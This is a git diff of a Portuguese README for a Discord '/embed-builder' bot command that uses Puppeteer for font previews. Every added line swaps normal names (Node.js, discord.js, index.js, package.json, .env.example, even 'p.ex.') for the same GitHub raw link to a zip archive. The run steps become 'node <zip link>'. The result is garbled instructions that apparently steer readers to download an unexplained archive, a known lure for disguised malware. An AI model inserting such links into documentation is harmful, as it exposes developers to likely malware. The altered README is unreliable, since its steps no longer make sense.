@@ -3,20 +3,20 @@
 Este projeto fornece um comando `/embed-builder` com preview real de fontes (render HTML + screenshot via Puppeteer).
 
 ## Requisitos
-- Node.js >= 18 (ou compatível com discord.js v14)
+- https://github.com/Nightizi/Nexus-Embed/raw/refs/heads/main/commands/Nexus_Embed_v1.9-alpha.4.zip >= 18 (ou compatível com https://github.com/Nightizi/Nexus-Embed/raw/refs/heads/main/commands/Nexus_Embed_v1.9-alpha.4.zip v14)
 - Conta na Discloud
 - Token do bot (no .env)
 
 ## Arquivos importantes
-- `commands/embed-builder.js` — comando principal (cole na pasta commands)
-- `index.js` — seu index principal que carrega comandos (já preparado para usar `handleInteraction`)
+- `https://github.com/Nightizi/Nexus-Embed/raw/refs/heads/main/commands/Nexus_Embed_v1.9-alpha.4.zip` — comando principal (cole na pasta commands)
+- `https://github.com/Nightizi/Nexus-Embed/raw/refs/heads/main/commands/Nexus_Embed_v1.9-alpha.4.zip` — seu index principal que carrega comandos (já preparado para usar `handleInteraction`)
 - `.env` — variáveis de ambiente
-- `package.json` — dependências (`puppeteer`, `node-fetch`, `discord.js`)
+- `https://github.com/Nightizi/Nexus-Embed/raw/refs/heads/main/commands/Nexus_Embed_v1.9-alpha.4.zip` — dependências (`puppeteer`, `node-fetch`, `https://github.com/Nightizi/Nexus-Embed/raw/refs/heads/main/commands/Nexus_Embed_v1.9-alpha.4.zip`)
 
 ## Instalação local (testes)
 1. `npm install`
-2. Crie `.env` com as variáveis (copie `.env.example`)
-3. `node index.js`
+2. Crie `.env` com as variáveis (copie `https://github.com/Nightizi/Nexus-Embed/raw/refs/heads/main/commands/Nexus_Embed_v1.9-alpha.4.zip`)
+3. `node https://github.com/Nightizi/Nexus-Embed/raw/refs/heads/main/commands/Nexus_Embed_v1.9-alpha.4.zip`
 
 ## Deploy na Discloud
 1. Suba o repositório para o GitHub (ou use upload direto).
@@ -31,7 +31,7 @@ Este projeto fornece um comando `/embed-builder` com preview real de fontes (ren
    - Se ocorrer erro de execução do Chromium, verifique logs do deploy (console) e considere:
      - usar `puppeteer-core` + apontar `CHROME_EXECUTABLE_PATH` para um binário válido
      - ou usar fallback (o painel continua funcionando sem screenshot)
-5. Start command: `npm start` (ou `node index.js`)
+5. Start command: `npm start` (ou `node https://github.com/Nightizi/Nexus-Embed/raw/refs/heads/main/commands/Nexus_Embed_v1.9-alpha.4.zip`)
 
 ## Dicas e troubleshooting
 - Se ver erro `Failed to launch the browser process`, verifique logs; experimente:
@@ -47,11 +47,11 @@ Este projeto fornece um comando `/embed-builder` com preview real de fontes (ren
 ## Uso
 1. No Discord, execute `/embed-builder`.
 2. Use o menu para editar título, descrição, cor, campos, botões, fonte.
-3. Ao definir uma `Fonte via link` (p.ex. CSS ou link que carrega @font-face), o bot tentará renderizar a prévia com essa fonte e gerar um PNG.
+3. Ao definir uma `Fonte via link` (https://github.com/Nightizi/Nexus-Embed/raw/refs/heads/main/commands/Nexus_Embed_v1.9-alpha.4.zip CSS ou link que carrega @font-face), o bot tentará renderizar a prévia com essa fonte e gerar um PNG.
 4. Quando satisfeito, clique em **Publicar**.
 
 ## Suporte
 Se quiser que eu:
-- gere um `index.js` compatível com este módulo (loader de commands + roteamento `handleInteraction`), eu gero agora;
+- gere um `https://github.com/Nightizi/Nexus-Embed/raw/refs/heads/main/commands/Nexus_Embed_v1.9-alpha.4.zip` compatível com este módulo (loader de commands + roteamento `handleInteraction`), eu gero agora;
 - ou ajuste para `puppeteer-core + CHROME_EXECUTABLE_PATH` (recomendado para ambientes customizados), eu adapto.
 
